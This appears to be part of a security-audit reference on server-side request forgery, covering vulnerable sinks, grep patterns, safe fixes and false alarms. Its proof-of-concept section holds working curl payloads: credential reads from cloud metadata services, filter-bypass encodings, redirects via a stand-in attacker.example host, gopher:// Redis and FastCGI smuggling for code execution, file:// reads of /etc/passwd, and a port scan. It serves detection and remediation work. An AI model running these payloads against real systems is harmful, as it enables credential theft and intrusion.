When the server **processes** a user-supplied SVG (thumbnail, preview, PDF export, format conversion via `librsvg`/ImageMagick/Inkscape/headless browser/`resvg`), external references inside the SVG fire as **server-side** outbound requests (and local file reads). The upload looks like an image; the rasterizer is the SSRF sink.

```xml
<!-- VULN: each of these fetches server-side when the SVG is rendered -->
<image xlink:href="http://169.254.169.254/latest/meta-data/" .../>      <!-- raster image ref -->
<?xml-stylesheet type="text/css" href="http://169.254.169.254/"?>       <!-- stylesheet ref -->
<pattern><image xlink:href="http://127.0.0.1:6379/"/></pattern>        <!-- pattern fill ref -->
<style>@font-face{font-family:x;src:url('http://169.254.169.254/')}</style>  <!-- font ref -->
```

**VULN condition**: user-uploaded/POSTed SVG (or any XML the renderer treats as SVG) is rendered server-side without disabling external resource loading. SVG is also XML — the same input can carry XXE (cross-ref `xxe.md`) and, if served inline to a browser, stored XSS (cross-ref `xss.md`).

**Grep seeds**: `rsvg|imagemagick|convert .*\.svg|inkscape|resvg|puppeteer|playwright|wkhtmlto|cairosvg|svg2(png|pdf)`; upload handlers accepting `image/svg+xml`.

**SAFE**: disable external entity/resource loading in the renderer (e.g. ImageMagick policy.xml denying `URL`/`HTTPS`/`MSL`/`text`; `cairosvg`/`resvg` with remote fetch off); sanitize SVG (strip `href`/`xlink:href`/`xml-stylesheet`/`@font-face`/external `url()`); rasterize in a network-isolated sandbox. Cross-ref `arbitrary_file_upload.md`.

## Media / Document Converter SSRF

Converters that parse a user-supplied media or document file follow embedded URLs/playlists/segment lists server-side — SSRF plus local file disclosure, no URL parameter required.

- **ffmpeg / video converters**: HLS `.m3u8` playlists and crafted `.avi`/container files reference external or `file:`/`concat:`/`http:` segments — ffmpeg fetches them and can splice local files into the output (`file_reading` AVI trick).
- **ImageMagick**: MVG/MSL and SVG delegates with `url(...)`, `image:`/`https:` directives reach remote and local resources (cross-ref `rce.md` for delegate command injection).
- **PDF / office / HTML-to-X renderers**: remote images, stylesheets, XInclude, or `<iframe>`/`<img>` in the source document are fetched during conversion.

**VULN condition**: user controls the file (or a URL inside it) handed to a converter that resolves embedded references, with no scheme/host restriction on those references.

**Grep seeds**: `ffmpeg|m3u8|concat:|libavformat`; `convert |mogrify|MagickWand|Image::Magick`; `wkhtmltopdf|weasyprint|libreoffice|unoconv|gotenberg|prince`.

**SAFE**: convert with remote/non-essential protocols disabled (ffmpeg `-protocol_whitelist file,crypto` scoped tightly; ImageMagick policy.xml; PDF renderer with remote fetch disabled); run converters in a sandbox with no egress and no sensitive filesystem access.

## Java Additional SSRF Sinks

```java
// VULNERABLE: XML parser as SSRF vector
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
db.parse(new InputSource(userInput));   // userInput = "http://169.254.169.254/"

// VULNERABLE: ImageIO fetching remote URL
BufferedImage img = ImageIO.read(new URL(userInput));

// VULNERABLE: URL class loader loading from user URL
URLClassLoader loader = new URLClassLoader(new URL[]{new URL(userInput)});

// VULNERABLE: Jsoup connecting to user URL
Document doc = Jsoup.connect(userInput).get();

// VULNERABLE: Apache HttpComponents
CloseableHttpClient client = HttpClients.createDefault();
HttpGet get = new HttpGet(userInput);
client.execute(get);
```

## SSRF in Cloud/Kubernetes Environments — Additional Targets

When running on cloud/k8s, these internal URLs are high-value SSRF targets:
- `http://169.254.169.254/` — AWS/Azure/GCP instance metadata (the shared link-local IP)
- `http://instance-data/latest/meta-data/` — AWS hostname alias for the metadata IP (bypasses IP-string blocklists)
- `http://169.254.170.2/v2/credentials/` — AWS ECS/Fargate task-role credentials endpoint
- `http://metadata.google.internal/computeMetadata/v1/...?recursive=true` — GCP (header `Metadata-Flavor: Google`; recursive pulls whole subtrees)
- `http://100.100.100.200/latest/meta-data/` — Alibaba Cloud metadata
- `http://169.254.169.254/metadata/v1.json` — DigitalOcean (no header)
- `http://169.254.169.254/opc/v1/instance/` and `http://192.0.0.192/latest/meta-data/` — Oracle Cloud (two distinct endpoints/IPs)
- `http://metadata.tencentyun.com/latest/meta-data/` — Tencent Cloud
- `http://169.254.169.254/openstack/latest/meta_data.json` — OpenStack / Huawei Cloud
- `https://metadata.packet.net/userdata` — Equinix Metal / Packet
- `http://kubernetes.default.svc/` — K8s API server (internal)
- `http://10.0.0.1/` — typical internal gateway
- Redis on `redis://localhost:6379` — via gopher:// if supported

Flag any user-controlled URL fetch where these are not explicitly blocked. Note that hostname aliases (`instance-data`, `metadata.google.internal`, `metadata.tencentyun.com`) and the alternate IPs (`169.254.170.2`, `100.100.100.200`, `192.0.0.192`) defeat blocklists that only string-match `169.254.169.254`. Cross-ref `kubernetes_cloud_security.md`.

## URL-Fetch / Media-Proxy SSRF (`url=` parameter pattern)

A very common SSRF shape is an endpoint that accepts a full URL (or host) in a request parameter and fetches it server-side as a "convenience" feature. This is a **class**, not a single product — detect it by the *fetch-by-user-URL* shape regardless of framework or language.

**Source parameter names to flag** (when the value is, or becomes, an absolute URL/host passed to an outbound client): `url`, `src`, `source`, `image`, `imageUrl`, `img`, `target`, `dest`, `uri`, `link`, `feed`, `callback`, `webhook`, `to`, `proxy`, `fetch`, `load`, `remote`.

**Feature archetypes — all the same class:**
- Image optimizers / resizers / thumbnailers (`/image?url=`, `/cdn-cgi/image/`, imgproxy, thumbor, Cloudinary `fetch`)
- Link preview / URL unfurling / oEmbed / favicon fetchers
- PDF / screenshot / HTML-to-image renderers (a headless browser fetches the URL)
- "Import from URL" / avatar-from-URL / remote file import
- Outbound webhooks / health-check pingers where the caller sets the URL

**Concrete instance — Next.js Image Optimization (`/_next/image?url=...`)**: the optimizer fetches `url` server-side; the host allowlist lives in `next.config.js`.
```js
// VULN — wildcard host allowlist lets the optimizer fetch ANY host (SSRF)
images: { remotePatterns: [{ protocol: 'https', hostname: '**' }] }   // or hostname: '*'
images: { domains: ['*'] }                                            // legacy field, same problem
// VULN — broad subdomain wildcard: pivot to internal via an open redirect on ANY matching subdomain
images: { remotePatterns: [{ hostname: '*.example.com' }] }
// SAFE — explicit, non-wildcard hosts only
images: { remotePatterns: [{ protocol: 'https', hostname: 'cdn.example.com' }] }
```
- **VULN**: `dangerouslyAllowSVG: true` (or any image proxy that serves the fetched SVG inline) — attacker points `url=` at a malicious SVG and gets stored/reflected XSS in the app origin. SVG is active content; see `xss.md`.

**What to flag**: any archetype above where the destination host is user-controlled and there is NO explicit non-wildcard host allowlist, NO scheme restriction to `http(s)`, and NO block of internal ranges / metadata IPs. The "resize / preview / import" feature is not a mitigation — it **is** the sink.

**FALSE POSITIVE**: destination restricted to an explicit non-wildcard host allowlist; user value confined to a path segment under a hardcoded base; `url=` only ever resolves to a fixed first-party asset host with validation.

### Webhook Test / Verify URL Features

Integration UIs often expose **test**, **ping**, **verify**, or **validate** actions that POST/GET a user-supplied callback URL server-side — same SSRF class as `url=` proxies with higher trust (may run from job workers with cloud credentials). See `webhook_integration_security.md` for CRUD IDOR, inbound signature gaps, and naming patterns (`testWebhook`, `pingWebhook`, `verifyUrl`, `sendTest`, `validateWebhook`).

**Grep seeds**: `testWebhook`, `pingWebhook`, `verifyUrl`, `sendTest`, `validateWebhook`, `checkEndpoint`, `webhook.*test`, `callback.*verify`.

## SSRF via Host / Forwarded Headers (request-context-derived URLs)

Servers sometimes build an *internal* request URL from request-context headers the client controls — `Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`, `Referer`, `Origin`. Because these are attacker-controllable, the "internal" fetch (or generated absolute link/callback) can be redirected to an arbitrary host. Framework-agnostic class; also drives password-reset link poisoning and cache poisoning.

**VULN shape**: `fetch(`${req.headers['x-forwarded-host']}/internal/path`)`; `new URL(path, `https://${req.headers.host}`)` then fetched; building absolute callback/reset URLs from `Host`.

### Referer (and Other Headers) as Outbound Fetch Source

**VULN condition**: background jobs, analytics, link preview, or "fetch URL from header" helpers pass `Referer`, `Origin`, `X-Forwarded-For`-derived URLs, or stored header values directly to outbound HTTP clients — not just Host-derived absolute URL construction.

```javascript
// VULN: Referer header becomes SSRF sink
const ref = req.headers.referer || req.headers.referrer;
await axios.get(ref);  // attacker sets Referer: http://169.254.169.254/
```

```python
# VULN: webhook/ping uses Referer or callback header without allowlist
requests.get(request.headers.get('Referer'))
```

**Grep seeds**: `referer`, `referrer`, `headers\[.Referer`, `getHeader\(.Referer`, `req\.headers\.referer` adjacent to `fetch|requests\.|HttpClient|axios|curl`.

**SAFE**: never fetch raw header URLs; if required, parse and allowlist hostname same as explicit `url=` parameters.

**Concrete instance — Next.js Server Actions** (`"use server"` functions dispatched via the `Next-Action` header): older versions built the internal subrequest URL from the request `Host` header, so a spoofed `Host` turned action dispatch into blind→full-read SSRF (the `Next-Action` token selects the function; the request path is ignored). Generic lesson: any server-side request whose **authority** is derived from a request header is SSRF unless the host is validated against an allowlist.

**SAFE**: derive the base URL from server config/environment (e.g. `process.env.PUBLIC_URL`), not from request headers; validate `Host`/`X-Forwarded-Host` against an allowlist before use.

### Overly-permissive reverse proxy (Host-routed upstream)

A reverse proxy whose **upstream is derived from the request** turns the proxy itself into an SSRF primitive — the attacker sets the `Host` header (or a path/variable the proxy interpolates) and the proxy forwards to an internal target.

```nginx
# VULN: upstream built from the client-controlled Host header
location / {
    proxy_pass http://$http_host;          # attacker: Host: 169.254.169.254
}
# VULN: upstream taken from a request variable / path segment
location /proxy/ {
    proxy_pass http://$arg_target;          # ?target=169.254.169.254
}
```

```bash
# Equivalent at the wire level: open proxy routes by Host header
curl http://target/latest/meta-data/ -H "Host: 169.254.169.254"
```

**VULN condition**: `proxy_pass`/`ProxyPass`/upstream address contains a variable fed by `$http_host`, `$host`, `$arg_*`, `$request_uri`, or a user path segment with no allowlist. **SAFE**: hardcode upstreams (or map through a fixed allowlist), and set the upstream `Host` from config, not the inbound header. Cross-ref `nginx_security.md`, `reverse_proxy_access_bypass.md`, `host_header_poisoning.md`.

**Recognized sanitizers summary**: hostname-sanitizing prefixes, allowlist/`contains` guards, host equality checks, regexp barriers, fixed-prefix string construction (Python partial), `encodeURIComponent` (JS), redirect-check helpers (Go), `AntiSSRF` validators (Python), models-as-data `request-forgery` barriers.

## GraphQL Resolver SSRF

GraphQL **resolver arguments** are remote user input. Resolvers that fetch remote resources — webhooks, import-from-URL, avatar/image proxy, link preview — pass `args` fields directly into outbound HTTP clients. The same SSRF class applies when the destination is a **single URL string** or **decomposed components** (`scheme`, `host`, `port`, `path` / `baseUrl` + `path`) assembled server-side.

**Field/arg name heuristics** (when value reaches a fetch sink): `url`, `importUrl`, `fetchUrl`, `download`, `remote_url`, `target_url`, `webhook`, `callback`, `imageUrl`, `source`, `link`, `endpoint`.

**Vulnerable conditions**:
- Resolver builds `fetch(args.url)` / `requests.get(args.importUrl)` with no host allowlist
- Decomposed args: `f"{args.scheme}://{args.host}:{args.port}{args.path}"` then `axios.get(...)` — attacker sets `host` to `169.254.169.254` or `metadata.google.internal`
- Stored URL on a GraphQL type resolved later without write-time or read-time allowlist validation

**Grep seeds** — resolver signature → outbound client:
```bash
rg -n "async\s+\w+\(|def\s+\w+\(|func\s+\(.*\)\s*\(|resolve\s*\(" --glob '*.{js,ts,py,go,java,rb,cs}' -A12 | rg -n "importUrl|fetchUrl|remote_url|target_url|download|webhook|callback|imageUrl"
rg -n "(importUrl|fetchUrl|remote_url|target_url|args\.(url|host|scheme|port|path))" --glob '*.{js,ts,py,go,java}' -A3 | rg -n "fetch\(|requests\.(get|post)|axios\.|http\.Get|HttpClient|urllib|httpx|aiohttp"
rg -n "scheme.*host|host.*port.*path|baseUrl.*path" --glob '*.{js,ts,py,go}' -B2 -A4 | rg -n "fetch|requests|axios|http\.Get"
```

**VULN**:
```python
def resolve_import_url(parent, info, url):
    return requests.get(url).text  # args.url fully attacker-controlled

def resolve_fetch(parent, info, scheme, host, port, path):
    return httpx.get(f"{scheme}://{host}:{port}{path}").json()  # decomposed SSRF
```

**SAFE**: same as general SSRF — strict hostname allowlist, resolve-then-validate IP with pinning, scheme restricted to `https`, user input never as authority; apply at resolver boundary before any outbound call. Cross-ref `graphql_injection.md` (resolver-layer injection vs document injection).

## Blind SSRF — Internal Gadget / Impact Catalog

Even a **blind** SSRF (no response body returned) escalates when it can reach an internal service. Use this to judge severity in triage and to justify scheme/port restrictions in remediation — a "harmless" blind fetcher on a host that can talk to Redis or FastCGI is effectively RCE.

| Internal gadget | Reached via | Escalation |
|-----------------|-------------|------------|
| Redis | `gopher://`/`dict://` :6379 | RCE — `CONFIG SET dir`+`save` to cron/`authorized_keys`/webshell |
| Memcached | `gopher://`/`dict://` :11211 | Cache poisoning, object-injection → RCE in some apps |
| FastCGI / PHP-FPM | `gopher://` :9000 | RCE via `PHP_VALUE` (`auto_prepend_file`, `allow_url_include`) |
| MySQL / PostgreSQL | `gopher://` :3306 / :5432 | Auth-less query execution where trust-local is configured |
| Docker API | `http://` :2375 / unix socket | Container create/exec → host RCE |
| Kubernetes API / kubelet | `https://` kube-api / :10250 | Pod exec, secret read → cluster takeover |
| Consul / Nomad | `http://` :8500 / :4646 | Service/script registration → RCE |
| Elasticsearch / Solr | `http://` :9200 / :8983 | Data read; Solr DataImportHandler/velocity → RCE; Solr XXE |
| Jenkins / Hudson | `http://` :8080 | Script console → RCE |
| Spring Boot Actuator | `http://` `/actuator/*` | Heap/env dump (creds), `/jolokia` → RCE |
| App servers (WebLogic/JBoss/Struts) | `http://` internal | Known unauth RCE chains (often CRLF-assisted) |
| Metrics exporters (Prometheus/Grafana) | `http://` exporter port | Data-source SSRF pivot (e.g. CVE-2020-13379) |

**SAST takeaway**: severity of any user-controlled outbound fetch should assume these gadgets are reachable unless egress is network-restricted; the presence of `gopher`/`dict`/`file` scheme support escalates blind SSRF to RCE-class.

## Dynamic Test / PoC

Confirm suspected SSRF at runtime when the endpoint is reachable:

**Cloud metadata (full-read signal)**
```bash
curl "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expect: IAM role name or instance metadata in response body
```

**AWS IMDSv2 (token-required, now the default)** — IMDSv1 above returns 401 on IMDSv2-only hosts. Confirmation needs the two-step token flow, which only works if the SSRF primitive can send a `PUT` and custom headers (e.g. a full request-forging gadget):
```bash
# 1) Obtain a session token (PUT with TTL header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# 2) Use it to read credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
# A GET-only SSRF that cannot set the token header cannot reach IMDSv2 — note this in triage.
```

**Internal pivot / port probe**
```bash
curl "https://app.example.com/proxy?url=http://127.0.0.1:6379/"
# Expect: Redis banner, connection error with service fingerprint, or timing difference
```

**Blind SSRF (OAST)**
```bash
curl "https://app.example.com/webhook?url=http://YOUR-COLLABORATOR.oast.fun/ssrf-test"
# Expect: DNS/HTTP callback at collaborator; no response body needed
```

**Cloud metadata — GCP / Azure**
```bash
curl "https://app.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# GCP: add header Metadata-Flavor: Google if the app forwards request headers
# Expect: instance metadata or service-account paths in response
```

**Filter bypass (when blocklist/allowlist checks hostname only)**
```bash
# Alternate IP encodings of 169.254.169.254 (metadata)
curl "https://app.example.com/fetch?url=http://2852039166/"             # dotless decimal
curl "https://app.example.com/fetch?url=http://0xa9fea9fe/"             # dotless hex
curl "https://app.example.com/fetch?url=http://0251.0376.0251.0376/"    # dotted octal
curl "https://app.example.com/fetch?url=http://[::ffff:169.254.169.254]/"  # IPv6 v4-mapped
curl "https://app.example.com/fetch?url=http://169.254.169.254.nip.io/" # wildcard-DNS helper
# Alternate encodings of 127.0.0.1 (loopback)
curl "https://app.example.com/fetch?url=http://2130706433/"             # decimal
curl "https://app.example.com/fetch?url=http://0x7f000001/"             # hex
curl "https://app.example.com/fetch?url=http://127.1/"                  # short form
curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded
# Authority / parser confusion (allowlisted host on the left)
curl "https://app.example.com/fetch?url=http://allowed.com@169.254.169.254/"
curl "https://app.example.com/fetch?url=http://169.254.169.254%2509allowed.com/"
curl "https://app.example.com/fetch?url=http://allowed.com\\@169.254.169.254/"
# Redirect + rebinding chains (allowlisted host 30x-redirects to the internal target)
curl "https://app.example.com/fetch?url=http://attacker.example/redirect?to=http://169.254.169.254/"
# Scheme switch on redirect: allowlisted http(s) host returns Location: gopher:// (escapes scheme allowlist)
curl "https://app.example.com/fetch?url=http://attacker.example/r?to=gopher://127.0.0.1:6379/_INFO"
# Fake extension: allowlisted ...jpg passes an image-only check, then 30x-redirects to metadata
curl "https://app.example.com/fetch?url=http://attacker.example/thumb.jpg"   # responds 301 Location: http://169.254.169.254/latest/meta-data/
# Non-standard 3xx code (e.g. 332) — set your redirector to emit it; permissive clients still follow
# Expect: same internal/metadata content as direct 127.0.0.1 or 169.254.169.254 probes
```

**Non-HTTP schemes (when client supports them)**
```bash
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
# Expect: Redis INFO banner or protocol-specific response
curl "https://app.example.com/fetch?url=dict://127.0.0.1:6379/INFO"
# dict:// — line-oriented probe of Redis/memcached/FTP-style services when gopher:// is unavailable
curl "https://app.example.com/fetch?url=file:///etc/passwd"
# file:// — local file disclosure (SSRF->LFI) when the client supports it
```

**Protocol smuggling via gopher (RCE primitives — write multiline backend commands)**
```bash
# Redis: CRLF-encoded command stream → CONFIG SET dir/dbfilename + SAVE (cron/authorized_keys/webshell)
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."
# FastCGI/PHP-FPM: gopher to :9000 with PHP_VALUE (auto_prepend_file=php://input) → RCE
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:9000/_%01%01..."
# Expect: side effect on the backend (key written, file created); blind — confirm via OAST or behavior
```

**SVG / media-converter SSRF (upload-driven, no url= parameter)**
```bash
# Upload an SVG whose external ref points at metadata; server-side rasterizer fetches it
printf '%s' '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>' > poc.svg
curl -F "file=@poc.svg" "https://app.example.com/upload-avatar"
# HLS playlist handed to a video converter pulls an attacker/internal segment
printf '%s\n' '#EXTM3U' '#EXTINF:1,' 'http://169.254.169.254/latest/meta-data/' > poc.m3u8
curl -F "file=@poc.m3u8" "https://app.example.com/convert"
# Expect: OAST callback / metadata content embedded in the rendered output
```

**Broadened cloud metadata (provider-specific)**
```bash
curl "https://app.example.com/fetch?url=http://instance-data/latest/meta-data/"              # AWS hostname alias
curl "https://app.example.com/fetch?url=http://169.254.170.2/v2/credentials/"                # AWS ECS task role
curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/v1.json"             # DigitalOcean
curl "https://app.example.com/fetch?url=http://169.254.169.254/opc/v1/instance/"             # Oracle Cloud
curl "https://app.example.com/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"    # Tencent Cloud
curl "https://app.example.com/fetch?url=http://169.254.169.254/openstack/latest/meta_data.json"  # OpenStack/Huawei
```

**Internal port scan (timing/status oracle)**
```bash
for port in 80 443 8080 8443 3306 5432 6379 27017 9200; do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    "https://app.example.com/fetch?url=http://127.0.0.1:$port/" &
done
wait
# Expect: distinct status codes or latency per open port
```

Use the parameter name observed in code (`url`, `target`, `webhook`, etc.). Restrict protocols/ports in remediation — PoC confirms reachability, not safe design.

## Common False Alarms

- Hardcoded or configuration-only outbound URLs with no path from remote input to the sink
- Internal helper/sink methods with no reachable controller passing user-controlled URL data
- Duplicate findings for the same external-input-to-sink path through a utility wrapper
- Python string built as `"https://" + userHost + ".example.com/data/"` flagged as partial SSRF when user only picks subdomain label — verify whether authority is truly attacker-controlled
- JavaScript client-side request forgery where the browser, not the server, performs the fetch — different risk class than SSRF
- Taint originating from response bodies of outbound HTTP requests (Java explicitly excludes `getInputStream()` results)

- FALSE POSITIVE guard: in `vulhub`, emit `ssrf` only when a selected representative directory is primarily an SSRF sample; do not infer SSRF from XXE, proxy, inclusion, or secondary fetch capability alone.
- FALSE POSITIVE guard: do not emit a project-level `ssrf` tag merely because an SSRF helper or vulnerable class exists. Require a mapped vulnerable route plus the same demonstrated path from user-controlled URL input to the outbound fetch.
